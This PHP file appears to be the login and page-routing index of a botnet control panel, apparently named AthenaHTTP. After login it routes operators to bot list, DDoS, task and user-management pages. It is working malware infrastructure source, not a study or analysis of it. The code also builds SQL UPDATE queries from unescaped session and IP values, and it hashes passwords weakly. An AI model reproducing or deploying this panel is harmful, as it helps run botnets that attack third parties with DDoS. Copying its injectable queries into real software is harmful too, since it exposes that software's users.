<?php

	error_reporting(E_ERROR | E_PARSE);
	
	define('AthenaHTTP', '');
	require_once('./config.php');
	
	session_start();
	
	$LOGIN = false;
	
	if($_SESSION['username'] && $_SESSION['password'])
	{	
		$result = mysqli_query($conn, 'SELECT password FROM users WHERE username = \'' . mysqli_real_escape_string($conn, trim($_SESSION['username'])) . '\' LIMIT 1;');
		$row = mysqli_fetch_array($result);
		if($row)
		{
			// $row = mysqli_fetch_array($result);
			
			if($row['password'] == trim($_SESSION['password']))
				$LOGIN = true;
			else 
				session_unset();
		}
		else session_unset();
	}
	else if($_POST['username'] && $_POST['password'])
	{	
		
		$result = mysqli_query($conn, 'SELECT password FROM users WHERE username = \'' . mysqli_real_escape_string($conn, trim($_POST['username'])) . '\' LIMIT 1;');
		$row = mysqli_fetch_array($result);
		if($row)
		{
			// var_dump(hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password']))); exit;
			if($row['password'] == hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password'])))
			{
				$_SESSION['username'] = trim($_POST['username']);
				$_SESSION['password'] = hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password']));
				// var_dump(hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password']))); exit;
				$LOGIN = true;
			}
			else session_unset();
		}
		else session_unset();
	}
	
	if($LOGIN)
	{
		mysqli_query($conn, 'UPDATE users SET `lastip` = \'' . $_SERVER['REMOTE_ADDR'] . '\' WHERE username = \'' . $_SESSION['username'] . '\';');	//update users latest IP
		mysqli_query($conn, 'UPDATE users SET `lastseen` = \'' . $TIME . '\' WHERE username = \'' . $_SESSION['username'] . '\';');	//update users latest usage time
		
		$USERINFO = mysqli_fetch_array(mysqli_query($conn, 'SELECT * FROM users WHERE username = \'' . mysqli_real_escape_string($conn, trim($_SESSION['username'])) . '\' LIMIT 1;'));
		
		$config_loginpagekey = mysqli_fetch_array(mysqli_query($conn, 'SELECT `key` FROM config WHERE value = \'loginpagekey\';'));
		$config_loginpagekey_enabled = mysqli_fetch_array(mysqli_query($conn, 'SELECT data FROM config WHERE value = \'loginpagekey\';'));
		
		$config_online = mysqli_fetch_array(mysqli_query($conn, 'SELECT data FROM config WHERE value = \'knock\';'));
		$config_dead = mysqli_fetch_array(mysqli_query($conn, 'SELECT data FROM config WHERE value = \'dead\';'));
		
		define('ONLINE', $config_online['data']);
		define('DEAD', $config_dead['data']);
	
		$HEAD_USER = $USERINFO['username'];
		switch($_GET['p'])
		{
			case 'botlist':
				$ARROW_BOTLIST = '<p></p>';
				require_once './include/tpl_botlist.php';
				break;
				
			case 'ddos':
				if($USERINFO['priv2'] || $USERINFO['admin'])
				{
					$ARROW_DDOS = '<p></p>';
					require_once './include/tpl_ddos.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'checker':
				$ARROW_CHECKER = '<p></p>';
				require_once './include/tpl_webchecker.php';
				break;
				
			case 'misc':
				if($USERINFO['priv1'] || $USERINFO['priv2'] || $USERINFO['priv3'] || $USERINFO['priv4'] || $USERINFO['admin'])
				{
					$ARROW_MISC = '<p></p>';
					require_once './include/tpl_misc.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'tasks':
				$ARROW_TASKS = '<p></p>';
				require_once './include/tpl_activecommands.php';
				break;
			
			case 'userlist':
				if($USERINFO['admin'])
				{
					$ARROW_USERLIST = '<p></p>';
					require_once './include/tpl_userlist.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'prefs':
				$ARROW_PREFS = '<p></p>';
				require_once './include/tpl_prefs.php';
				break;
				
			case 'help':
				require_once './include/tpl_help.php';
				break;
			
			case 'logout':
				session_unset();
				header('Location: ./login');
				break;
				
			default: 
				$ARROW_BOTLIST = '<p></p>';
				require_once './include/tpl_botlist.php';
				// var_dump("dafsdfad"); exit;
				print $PAGE_INCLUDE;
				break;
		}
		require_once './include/tpl_main.php';	
		print $PAGE;
	}
	else
	{
		require_once './include/tpl_login.php';
		print $PAGE;
	}
?>